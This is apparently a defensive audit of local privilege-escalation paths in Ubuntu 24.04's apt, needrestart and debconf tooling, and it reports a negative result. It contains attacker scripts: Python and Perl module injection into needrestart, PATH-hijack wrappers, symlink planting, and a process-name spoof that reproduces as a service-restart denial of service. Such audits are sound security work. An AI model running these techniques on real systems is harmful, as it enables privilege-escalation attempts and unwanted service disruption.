# Negative: apt/needrestart/debconf deep audit

Date: 2026-05-16

Target: Docker image `ubuntu24-server-default-lpe:20260516-standard`, container `ubuntu24-server-lpe-target`, Ubuntu 24.04.4 LTS.

Attacker: `uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)`.

Result: no real stock Ubuntu 24.04 Server default uid1001-to-root LPE was found in the scoped apt, dpkg, needrestart, unattended-upgrades, package-data-downloader, debconf, or command-not-found paths. The only root-impactful behavior reproduced was needrestart fallback service name spoofing: a stale attacker process named `cron` can make root needrestart list `cron` for restart. That is a service restart/DoS primitive during a root needrestart run, not root code execution or file write as uid1001.

## Default package/version and reachability

Commands:

```sh
docker exec ubuntu24-server-lpe-target sh -lc '
  cat /etc/os-release | sed -n "1,12p"
  id attacker
  id selfauth
  dpkg-query -W -f="${binary:Package}\t${Version}\t${db:Status-Abbrev}\n" \
    apt apt-utils dpkg needrestart unattended-upgrades update-notifier-common \
    command-not-found python3-commandnotfound debconf debconf-i18n packagekit appstream 2>/dev/null | sort
  apt-config dump | grep -E "APT::Periodic|Unattended-Upgrade::InstallOnShutdown" | sort
'
```

Observed:

```text
PRETTY_NAME="Ubuntu 24.04.4 LTS"
VERSION_ID="24.04"
VERSION_CODENAME=noble
uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
uid=1002(selfauth) gid=1002(selfauth) groups=1002(selfauth)
appstream                    1.0.2-1build6
apt                          2.8.3
apt-utils                    2.8.3
command-not-found            23.04.0
debconf                      1.5.86ubuntu1
debconf-i18n                 1.5.86ubuntu1
dpkg                         1.22.6ubuntu6.6
needrestart                  3.6-7ubuntu4.5
packagekit                   1.2.8-2ubuntu1.5
python3-commandnotfound      23.04.0
unattended-upgrades          2.9.1+nmu4ubuntu1
update-notifier-common       3.192.68.2
APT::Periodic::Enable "0";
APT::Periodic::Unattended-Upgrade "1";
APT::Periodic::Update-Package-Lists "1";
```

Relevant default hooks:

```text
/etc/apt/apt.conf.d/70debconf:
DPkg::Pre-Install-Pkgs {"/usr/sbin/dpkg-preconfigure --apt || true";};

/etc/apt/apt.conf.d/99needrestart:
DPkg::Post-Invoke {"test -x /usr/lib/needrestart/apt-pinvoke && /usr/lib/needrestart/apt-pinvoke -m u || true"; };

/etc/apt/apt.conf.d/50command-not-found:
APT::Update::Post-Invoke-Success {
    "if /usr/bin/test -w /var/lib/command-not-found/ -a -e /usr/lib/cnf-update-db; then /usr/lib/cnf-update-db > /dev/null; fi";
};

/etc/apt/apt.conf.d/99update-notifier:
DPkg::Post-Invoke {"if [ -d /var/lib/update-notifier ]; then touch /var/lib/update-notifier/dpkg-run-stamp; fi; /usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true";};
APT::Update::Post-Invoke-Success {"/usr/lib/update-notifier/update-motd-updates-available 2>/dev/null || true";};
```

Root services/timers were present for `apt-daily`, `apt-daily-upgrade`, `dpkg-db-backup`, `unattended-upgrades`, `update-notifier-download`, and `update-notifier-motd`. The system manager environment was not user-controlled:

```sh
docker exec ubuntu24-server-lpe-target sh -lc '
  runuser -u attacker -- systemctl set-environment PATH=/home/attacker/bin:/usr/bin:/bin 2>&1 || true
  runuser -u attacker -- systemctl import-environment PATH 2>&1 || true
  runuser -u attacker -- systemd-run --unit=attacker-env-test /bin/true 2>&1 || true
  runuser -u attacker -- systemctl start apt-daily.service 2>&1 || true
  runuser -u attacker -- sh -lc "apt-get update -qq; echo rc:\$?" 2>&1
  systemctl show-environment | sort
'
```

Observed:

```text
Failed to set environment: Access denied
Failed to import environment: Access denied
Failed to start transient service unit: Interactive authentication required.
Failed to start apt-daily.service: Interactive authentication required.
E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
E: Unable to lock directory /var/lib/apt/lists/
rc:100
LANG=C.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
```

## Write/cache gates

Commands:

```sh
docker exec ubuntu24-server-lpe-target sh -lc '
  for p in /var/cache/debconf /var/cache/debconf/tmp.ci /var/cache/apt/archives/partial \
           /var/lib/apt/lists/partial /var/lib/dpkg /var/backups \
           /usr/share/package-data-downloads \
           /var/lib/update-notifier/package-data-downloads \
           /var/lib/update-notifier/package-data-downloads/partial \
           /var/lib/command-not-found /run/needrestart \
           /var/run/unattended-upgrades.pid /var/run/unattended-upgrades.progress; do
    if [ -e "$p" ] || [ -L "$p" ]; then stat -Lc "%A %U:%G %n type=%F" "$p"; else echo MISSING "$p"; fi
  done
  runuser -u attacker -- find /etc/apt /etc/needrestart /etc/update-notifier \
    /usr/share/package-data-downloads /var/cache/apt /var/lib/apt /var/lib/dpkg \
    /var/cache/debconf /var/lib/command-not-found /var/lib/update-notifier \
    /var/backups /run /var/run -maxdepth 4 -writable -printf "%m %u:%g %p -> %l\n" 2>/dev/null | sort
'
```

Relevant observed state:

```text
drwxr-xr-x root:root /var/cache/debconf type=directory
MISSING /var/cache/debconf/tmp.ci
drwx------ _apt:root /var/cache/apt/archives/partial type=directory
drwx------ _apt:root /var/lib/apt/lists/partial type=directory
drwxr-xr-x root:root /var/lib/dpkg type=directory
drwxr-xr-x root:root /var/backups type=directory
drwxr-xr-x root:root /usr/share/package-data-downloads type=directory
drwxr-xr-x root:root /var/lib/update-notifier/package-data-downloads type=directory
drwx------ _apt:root /var/lib/update-notifier/package-data-downloads/partial type=directory
drwxr-xr-x root:root /var/lib/command-not-found type=directory
MISSING /run/needrestart
MISSING /var/run/unattended-upgrades.pid
MISSING /var/run/unattended-upgrades.progress
```

Attacker write attempts:

```sh
docker exec -i ubuntu24-server-lpe-target bash -s <<'EOS'
runuser -u attacker -- bash -lc "ln -s /tmp/nrdeep_debconf_target /var/cache/debconf/tmp.ci" 2>&1 || true
runuser -u attacker -- bash -lc "printf 'Script: /home/attacker/nrdeep/bin/hit\n' > /usr/share/package-data-downloads/nrdeep" 2>&1 || true
runuser -u attacker -- bash -lc "ln -s /tmp/nrdeep_pdd /var/lib/update-notifier/package-data-downloads/nrdeep" 2>&1 || true
runuser -u attacker -- bash -lc "touch /var/lib/command-not-found/nrdeep" 2>&1 || true
runuser -u attacker -- bash -lc "touch /var/lib/apt/lists/nrdeep_Commands-arm64" 2>&1 || true
EOS
```

Observed:

```text
ln: failed to create symbolic link '/var/cache/debconf/tmp.ci': Permission denied
bash: line 1: /usr/share/package-data-downloads/nrdeep: Permission denied
ln: failed to create symbolic link '/var/lib/update-notifier/package-data-downloads/nrdeep': Permission denied
touch: cannot touch '/var/lib/command-not-found/nrdeep': Permission denied
touch: cannot touch '/var/lib/apt/lists/nrdeep_Commands-arm64': Permission denied
```

## needrestart process metadata probes

The patched needrestart interpreter scanners still execute interpreter binaries to query include paths, but the default matchers only accept `/usr/bin`, `/usr/local/bin`, or Java-like `*/bin/java` paths. Python, Perl, and Ruby clear `%ENV` around the child execution; Ruby and Java are not installed by default in this target:

```text
ruby not-installed
ruby3.2 not-installed
default-jre-headless not-installed
openjdk-21-jre-headless not-installed
openjdk-17-jre-headless not-installed
nodejs not-installed
```

Python env payload command:

```sh
docker exec -i ubuntu24-server-lpe-target bash -s <<'EOS'
BASE=/home/attacker/nrdeep
rm -rf "$BASE" /tmp/nrdeep_python_import /tmp/nrdeep_needrestart_py.out
install -d -o attacker -g attacker "$BASE" "$BASE/py"
runuser -u attacker -- tee "$BASE/py/mymod.py" >/dev/null <<'PY'
import os
with open('/tmp/nrdeep_python_import', 'a') as f:
    f.write('mymod uid=%s euid=%s\n' % (os.getuid(), os.geteuid()))
PY
runuser -u attacker -- tee "$BASE/py/sleeper.py" >/dev/null <<'PY'
import mymod
import time
time.sleep(300)
PY
runuser -u attacker -- bash -lc "PYTHONPATH='$BASE/py' /usr/bin/python3 '$BASE/py/sleeper.py' >/tmp/nrdeep_py_user.out 2>&1 &"
sleep 1
cat /tmp/nrdeep_python_import
rm -f /tmp/nrdeep_python_import
/usr/sbin/needrestart -v -b -r l > /tmp/nrdeep_needrestart_py.out 2>&1 || true
cat /tmp/nrdeep_python_import 2>/dev/null || echo absent
grep -E 'NeedRestart::Interp::Python|nrdeep|obsolete script|source=' /tmp/nrdeep_needrestart_py.out | sed -n '1,40p'
pkill -u attacker -f nrdeep || true
rm -rf "$BASE" /tmp/nrdeep_*
EOS
```

Observed:

```text
mymod uid=1001 euid=1001
absent
[Core] #99760 is a NeedRestart::Interp::Python
[Python] #99760: source=/home/attacker/nrdeep/py/sleeper.py
```

Perl `PERL5LIB`/`PERL5OPT` payload command:

```sh
docker exec -i ubuntu24-server-lpe-target bash -s <<'EOS'
BASE=/home/attacker/nrdeep
rm -rf "$BASE" /tmp/nrdeep_perl_import /tmp/nrdeep_needrestart_perl.out
install -d -o attacker -g attacker "$BASE" "$BASE/perl"
runuser -u attacker -- tee "$BASE/perl/RootHit.pm" >/dev/null <<'PL'
package RootHit;
use POSIX qw(getuid geteuid);
open my $fh, '>>', '/tmp/nrdeep_perl_import';
print $fh 'RootHit uid=' . getuid() . ' euid=' . geteuid() . "\n";
close $fh;
1;
PL
runuser -u attacker -- tee "$BASE/perl/sleeper.pl" >/dev/null <<'PL'
use RootHit;
sleep 300;
PL
runuser -u attacker -- bash -lc "PERL5LIB='$BASE/perl' PERL5OPT='-MRootHit' /usr/bin/perl '$BASE/perl/sleeper.pl' >/tmp/nrdeep_perl_user.out 2>&1 &"
sleep 1
cat /tmp/nrdeep_perl_import
rm -f /tmp/nrdeep_perl_import
/usr/sbin/needrestart -v -b -r l > /tmp/nrdeep_needrestart_perl.out 2>&1 || true
cat /tmp/nrdeep_perl_import 2>/dev/null || echo absent
grep -E 'NeedRestart::Interp::Perl|nrdeep|obsolete script|source=' /tmp/nrdeep_needrestart_perl.out | sed -n '1,60p'
pkill -u attacker -f nrdeep || true
rm -rf "$BASE" /tmp/nrdeep_*
EOS
```

Observed:

```text
RootHit uid=1001 euid=1001
absent
[Core] #99782 is a NeedRestart::Interp::Perl
[Perl] #99782: source=/home/attacker/nrdeep/perl/sleeper.pl
```

Fake Java fd metadata command:

```sh
docker exec -i ubuntu24-server-lpe-target bash -s <<'EOS'
BASE=/home/attacker/nrdeep2
rm -rf "$BASE" /tmp/nrdeep2_needrestart_java.out
install -d -o attacker -g attacker "$BASE" "$BASE/bin"
cp /usr/bin/perl "$BASE/bin/java"
chown attacker:attacker "$BASE/bin/java"
chmod 755 "$BASE/bin/java"
runuser -u attacker -- tee "$BASE/java_holder.pl" >/dev/null <<'PL'
open my $fh, '<', '/home/attacker/nrdeep2/held.jar' or die $!;
sleep 300;
PL
runuser -u attacker -- bash -lc "printf jar > '$BASE/held.jar'; '$BASE/bin/java' '$BASE/java_holder.pl' >/tmp/nrdeep2_java_user.out 2>&1 & echo \$! > '$BASE/java.pid'"
sleep 1
rm -f "$BASE/held.jar"
/usr/sbin/needrestart -v -b -r l > /tmp/nrdeep2_needrestart_java.out 2>&1 || true
grep -E 'NeedRestart::Interp::Java|nrdeep2|obsolete|unexpected cgroup|NEEDRESTART-SVC' /tmp/nrdeep2_needrestart_java.out | sed -n '1,100p'
kill "$(cat "$BASE/java.pid")" 2>/dev/null || true
rm -rf "$BASE" /tmp/nrdeep2_*
EOS
```

Observed:

```text
[Core] #99987 is a NeedRestart::Interp::Java
[Core] #99987 uses obsolete script file(s):
[Core] #99987  /home/attacker/nrdeep2/held.jar (deleted)
[main] #99987 exe => /home/attacker/nrdeep2/bin/java
[Core] #99987 is a NeedRestart::Interp::Java
[main] #99987 unexpected cgroup '/docker/fd448ecbc1369b3391fb69933b0f55af5a71ce4cbe66aa844e9905aebffa2ea1/init.scope'
dpkg-query: no path found matching pattern /home/attacker/nrdeep2/bin/java
```

This is attacker metadata parsing only. The Java scanner does not execute the attacker-owned `java`; it stats fd targets and then fails package/service attribution.

Fallback rc-name spoof command:

```sh
docker exec -i ubuntu24-server-lpe-target bash -s <<'EOS'
BASE=/home/attacker/nrdeep
rm -rf "$BASE" /tmp/nrdeep_needrestart_cron.out
install -d -o attacker -g attacker "$BASE"
cp /bin/sleep "$BASE/cron"
chown attacker:attacker "$BASE/cron"
chmod 755 "$BASE/cron"
runuser -u attacker -- bash -lc "'$BASE/cron' 300 >/tmp/nrdeep_cron_user.out 2>&1 & echo \$! > '$BASE/cron.pid'"
sleep 1
rm -f "$BASE/cron"
/usr/sbin/needrestart -v -b -r l > /tmp/nrdeep_needrestart_cron.out 2>&1 || true
grep -E 'obsolete binary|nrdeep/cron|hook.d|PACKAGE\|cron|RC\|cron|NEEDRESTART-SVC|cron' /tmp/nrdeep_needrestart_cron.out | sed -n '1,100p'
kill "$(cat "$BASE/cron.pid")" 2>/dev/null || true
rm -rf "$BASE" /tmp/nrdeep_*
EOS
```

Observed:

```text
[main] #99826 uses obsolete binary /home/attacker/nrdeep/cron
[main] #99826 exe => /home/attacker/nrdeep/cron
[main] #99826 running /etc/needrestart/hook.d/10-dpkg
dpkg-query: no path found matching pattern /home/attacker/nrdeep/cron
[main] #99826 running /etc/needrestart/hook.d/20-rpm
[main] #99826 running /etc/needrestart/hook.d/90-none
[main] #99826 package: cron
[main] no pidfile reference found at cron
NEEDRESTART-SVC: cron
```

Why this is not a root LPE: the fallback hook only guesses an existing `/etc/init.d/cron` name from the attacker process basename. It does not execute attacker-controlled bytes, does not write attacker-controlled root files, and requires a later root needrestart run. In Ubuntu apt hook mode it can amount to an unwanted restart of an existing service, which is DoS/noise rather than uid1001-to-root.

## debconf and maintainer-helper semantics

`dpkg-preconfigure --apt` is reachable through the apt `DPkg::Pre-Install-Pkgs` hook. It reads deb paths from apt on stdin, creates `/var/cache/debconf/tmp.ci`, runs `apt-extracttemplates --tempdir /var/cache/debconf/tmp.ci ...`, loads extracted templates, chmods the extracted config script, and communicates with it as the package's debconf config script.

The dangerous helper semantics are package-maintainer controlled, not normal-user controlled in the stock system:

* apt transactions and deb paths require root/package-manager context.
* apt package inputs are repository/package controlled.
* `/var/cache/debconf` is root-owned `0755`; uid1001 cannot pre-create `tmp.ci` symlinks or files.
* root timer/service environments do not include uid1001 `PATH`, `DEBCONF_SYSTEMRC`, `DEBCONF_DB_OVERRIDE`, or `DEBCONF_USE_CDEBCONF`.

Direct attacker attempt:

```sh
docker exec -i ubuntu24-server-lpe-target bash -s <<'EOS'
BASE=/home/attacker/nrdeep2
rm -rf "$BASE" /tmp/nrdeep2_debconf_helper
install -d -o attacker -g attacker "$BASE" "$BASE/bin"
runuser -u attacker -- tee "$BASE/bin/apt-extracttemplates" >/dev/null <<'SH'
#!/bin/sh
id > /tmp/nrdeep2_debconf_helper
exit 0
SH
runuser -u attacker -- chmod 755 "$BASE/bin/apt-extracttemplates"
runuser -u attacker -- bash -lc "PATH='$BASE/bin':\$PATH DEBCONF_SYSTEMRC='$BASE/debconf.conf' DEBCONF_DB_OVERRIDE='File{$BASE/config.dat}' /usr/sbin/dpkg-preconfigure --apt <<<'$BASE/fake.deb'; echo rc:\$?" 2>&1
cat /tmp/nrdeep2_debconf_helper 2>/dev/null || echo absent
rm -rf "$BASE" /tmp/nrdeep2_*
EOS
```

Observed:

```text
debconf: DbDriver "passwords" warning: could not open /var/cache/debconf/passwords.dat: Permission denied
mkdir /var/cache/debconf/tmp.ci: Permission denied at /usr/sbin/dpkg-preconfigure line 76.
rc:13
absent
```

## Root service PATH payloads

`apt.systemd.daily`, `dpkg-db-backup`, debconf frontends, and unattended-upgrade shutdown contain unqualified helper calls (`apt-config`, `apt-get`, `unattended-upgrade`, `savelog`, `tar`, `apt-extracttemplates`, `stty`, etc.). In this default target the root-triggered service path does not inherit uid1001 environment and uid1001 cannot set the system manager environment.

Command:

```sh
docker exec -i ubuntu24-server-lpe-target bash -s <<'EOS'
BASE=/home/attacker/nrdeep
rm -rf "$BASE" /tmp/nrdeep_path_root
install -d -o attacker -g attacker "$BASE/bin"
runuser -u attacker -- tee "$BASE/bin/apt-config" >/dev/null <<'SH'
#!/bin/sh
id > /tmp/nrdeep_path_root
exec /usr/bin/apt-config "$@"
SH
runuser -u attacker -- tee "$BASE/bin/savelog" >/dev/null <<'SH'
#!/bin/sh
id >> /tmp/nrdeep_path_root
exec /usr/bin/savelog "$@"
SH
runuser -u attacker -- chmod 755 "$BASE/bin/apt-config" "$BASE/bin/savelog"
systemctl start dpkg-db-backup.service 2>&1 || true
systemctl start apt-daily.service 2>&1 || true
systemctl start update-notifier-download.service 2>&1 || true
cat /tmp/nrdeep_path_root 2>/dev/null || echo absent
rm -rf "$BASE" /tmp/nrdeep_*
EOS
```

Observed:

```text
absent
```

## Cleanup verification

Cleanup command used:

```sh
docker exec ubuntu24-server-lpe-target sh -lc '
  pkill -u attacker -f "nrdeep|sleeper.py|sleeper.pl|java_holder|/home/attacker/.*/cron" 2>/dev/null || true
  rm -rf /home/attacker/nrdeep /home/attacker/nrdeep2 /tmp/nrdeep_* /tmp/nrdeep2_* 2>/dev/null || true
  pgrep -a -u attacker -f "nrdeep|sleeper.py|sleeper.pl|java_holder|/home/attacker/.*/cron" || true
  for p in /home/attacker/nrdeep /home/attacker/nrdeep2 \
           /tmp/nrdeep_python_import /tmp/nrdeep_perl_import \
           /tmp/nrdeep_path_root /tmp/nrdeep2_debconf_helper; do
    [ -e "$p" ] && ls -ld "$p" || echo absent "$p"
  done
'
```

Observed:

```text
absent /home/attacker/nrdeep
absent /home/attacker/nrdeep2
absent /tmp/nrdeep_python_import
absent /tmp/nrdeep_perl_import
absent /tmp/nrdeep_path_root
absent /tmp/nrdeep2_debconf_helper
```

Conclusion: the remaining risky shapes are root-maintenance surfaces, but the stock default system does not expose a normal non-sudo local-user input boundary that turns them into root execution. Root execution remains gated on root-owned apt/debconf/update-notifier directories, root/package-maintainer apt transactions, or root/systemd manager environment.
